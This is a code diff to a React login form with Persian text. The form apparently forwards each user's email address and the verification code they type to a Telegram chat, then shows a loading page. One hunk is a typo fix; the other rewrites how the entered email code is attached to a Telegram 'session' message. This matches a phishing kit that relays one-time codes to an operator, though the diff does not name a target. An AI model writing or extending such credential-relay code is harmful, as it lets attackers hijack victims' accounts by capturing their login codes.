@@ -233,7 +233,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت و��قعی این کد به تلگرام ارسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
@@ -450,39 +450,24 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("🔄 Starting email code submission:", {
+      console.log("🔄 Updating session with email code:", {
         emailCode,
-        emailMessageId,
+        sessionId,
         email,
       });
 
-      if (emailMessageId) {
-        console.log(
-          "✅ Message ID found, updating existing message:",
-          emailMessageId,
-        );
-        // Update the existing message with both email and code
-        const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;
+      // Update the existing session message with email code
+      const result = await updateSessionWithEmailCode(sessionId, emailCode);
 
-        const updateResult = await updateCustomMessageInTelegram(
-          emailMessageId,
-          updatedMessage,
-        );
-        console.log("🔄 Update result:", updateResult);
+      console.log("🔄 Email code update result:", result);
+
+      if (result.success) {
+        console.log("✅ Session updated with email code successfully");
+        // Navigate to loading page after updating Telegram
+        setCurrentStep("loading");
       } else {
-        console.log("❌ No message ID found - این نباید اتفاق بیفتد!");
-        console.error(
-          "Critical: Email message ID is missing, cannot update message",
-        );
-        setErrors({
-          emailCode: "خطا در سیستم. لطفا مجدداً ایمیل را وارد کنید.",
-        });
-        setEmailStep("email");
-        return;
+        throw new Error("Failed to update session with email code");
       }
-
-      // Navigate to loading page after updating Telegram
-      setCurrentStep("loading");
     } catch (error) {
       console.error("Email code verification error:", error);
       setErrors({ emailCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید." });
